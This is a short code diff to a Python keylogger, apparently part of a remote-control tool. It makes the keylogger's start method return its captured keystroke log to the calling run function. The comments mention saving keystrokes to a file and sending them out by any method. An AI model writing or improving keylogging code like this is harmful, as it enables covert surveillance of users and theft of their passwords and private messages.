@@ -20,7 +20,7 @@ def run(**args):
     # if you want a keylogger to record keylogs to a local file 
     # (and then send it using your favorite method)
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
-    keylogger.start()
+    return_msg = keylogger.start()
     while True:
         time.sleep(30)
         if return_msg != "":
@@ -147,5 +147,6 @@ class Keylogger:
         print(f"{datetime.now()} - Started keylogger")
         # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
+        return self.log
 
     
